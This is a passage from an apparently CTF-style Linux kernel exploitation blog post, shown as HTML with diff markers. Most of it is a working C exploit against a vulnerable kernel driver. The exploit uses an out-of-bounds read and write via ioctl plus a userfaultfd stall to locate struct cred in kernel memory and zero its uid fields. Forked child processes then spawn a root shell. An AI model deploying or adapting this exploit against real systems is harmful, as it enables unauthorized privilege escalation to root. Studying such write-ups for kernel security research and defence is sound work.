class="line">&#125;item;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kcreate</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = <span class="number">0</span>;</span><br><span class="line">   ioctl(fd,HACK_CREATE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kfree</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   ioctl(fd,HACK_FREE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kwrite</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size,<span class="keyword">int64_t</span> offset)</span></span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = offset;</span><br><span class="line">   ioctl(fd,HACK_WRITE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kread</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size,<span class="keyword">int64_t</span> offset)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = offset;</span><br><span class="line">   ioctl(fd,HACK_READ,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">while_getroot</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;get root&quot;</span>);</span><br><span class="line">            execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[+] leak_handler created&quot;</span>);</span><br><span class="line">   sleep(<span class="number">0x100</span>); </span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   struct pollfd pollfd;</span></span><br><span class="line"><span class="comment">   int nready;</span></span><br><span class="line"><span class="comment">   pollfd.fd = uffd;</span></span><br><span class="line"><span class="comment">   pollfd.events = POLLIN;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   nready = poll(&amp;pollfd, 1, -1);</span></span><br><span class="line"><span class="comment">   if (nready != 1)</span></span><br><span class="line"><span class="comment">      errExit(&quot;[-] Wrong pool return value&quot;);</span></span><br><span class="line"><span class="comment">   nready = read(uffd, &amp;msg, sizeof(msg));</span></span><br><span class="line"><span class="comment">   if (nready &lt;= 0) &#123;</span></span><br><span class="line"><span class="comment">      errExit(&quot;[-]msg error!!&quot;);</span></span><br><span class="line"><span class="comment">   &#125;</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">   char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span></span><br><span class="line"><span class="comment">   if (page == MAP_FAILED)</span></span><br><span class="line"><span class="comment">      errExit(&quot;[-]mmap page error!!&quot;);</span></span><br><span class="line"><span class="comment">   struct uffdio_copy uc;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   memset(page, 0, sizeof(page));</span></span><br><span class="line"><span class="comment">// memcpy(page,&amp;modprobe_path,8);</span></span><br><span class="line"><span class="comment">   uc.src = (unsigned long)page;</span></span><br><span class="line"><span class="comment">   uc.dst = (unsigned long)msg.arg.pagefault.address &amp; ~(PAGE_SIZE - 1);;</span></span><br><span class="line"><span class="comment">   uc.len = PAGE_SIZE;</span></span><br><span class="line"><span class="comment">   uc.mode = 0;</span></span><br><span class="line"><span class="comment">   uc.copy = 0;</span></span><br><span class="line"><span class="comment">   ioctl(uffd, UFFDIO_COPY, &amp;uc);</span></span><br><span class="line"><span class="comment">   puts(&quot;[+] leak_handler done!!&quot;);</span></span><br><span class="line"><span class="comment">   return NULL;</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">long</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line"></span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;</span><br><span class="line">    ur.range.len = fault_page_len;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">uint64_t</span> size, offset, cred_offset=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> idx, cred_count;</span><br><span class="line">    <span class="keyword">uint32_t</span> * uint_ptr;</span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    initFD();</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(fork() == <span class="number">0</span>)&#123;</span><br><span class="line">            while_getroot();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *read_ptr = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>, DATA_OFFSET, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(read_ptr == MAP_FAILED)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;mmap mem error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    kcreate(<span class="number">0</span>,data,<span class="number">0x100</span>);</span><br><span class="line">    kread(<span class="number">0</span>,read_ptr,DATA_OFFSET,-DATA_OFFSET);</span><br><span class="line">    </span><br><span class="line">    uint_ptr = (<span class="keyword">uint32_t</span> *) read_ptr;</span><br><span class="line">    cred_count = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] trying to find struct cred....\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SEARCH_SIZE/<span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (uint_ptr[i] == UID &amp;&amp; uint_ptr[i+<span class="number">1</span>] == UID &amp;&amp; uint_ptr[i+<span class="number">2</span>] == UID &amp;&amp; uint_ptr[i+<span class="number">3</span>] == UID &amp;&amp; uint_ptr[i+<span class="number">4</span>] == UID &amp;&amp; uint_ptr[i+<span class="number">5</span>] == UID &amp;&amp; uint_ptr[i+<span class="number">6</span>] == UID &amp;&amp; uint_ptr[i+<span class="number">7</span>] == UID)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] find cred at offset: 0x%x\n&quot;</span>, i*<span class="number">4</span>);</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">                uint_ptr[i+j] = <span class="number">0</span>;</span><br><span class="line">            cred_count++;</span><br><span class="line">            <span class="keyword">if</span>(cred_count &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">                cred_offset = i*<span class="number">4</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cred_offset == <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;can&#x27;t find cred&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">char</span> * write_ptr = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>, DATA_OFFSET, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(write_ptr, read_ptr, SEARCH_SIZE);</span><br><span class="line"></span><br><span class="line">    fault_page = (<span class="keyword">uint64_t</span>)write_ptr + SEARCH_SIZE;</span><br><span class="line">    fault_page_len = DATA_OFFSET - SEARCH_SIZE;</span><br><span class="line">    register_userfault();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;write root cred back&quot;</span>);</span><br><span class="line">    kwrite(<span class="number">0</span>, write_ptr, DATA_OFFSET, -DATA_OFFSET);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/kernel/" rel="tag"><i class="fa fa-tag"></i> kernel</a>
+              <a href="/tags/modprobe-path-attack/" rel="tag"><i class="fa fa-tag"></i> modprobe_path attack</a>
+              <a href="/tags/tty-struct-attack/" rel="tag"><i class="fa fa-tag"></i> tty_struct attack</a>
+              <a href="/tags/cred-attack/" rel="tag"><i class="fa fa-tag"></i> cred attack</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/10/27/Linux%20RCU%E6%9C%BA%E5%88%B6/" rel="prev" title="Linux RCU机制">
+      <i class="fa fa-chevron-left"></i> Linux RCU机制
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">179</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">114</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">2.3m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">35:29</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
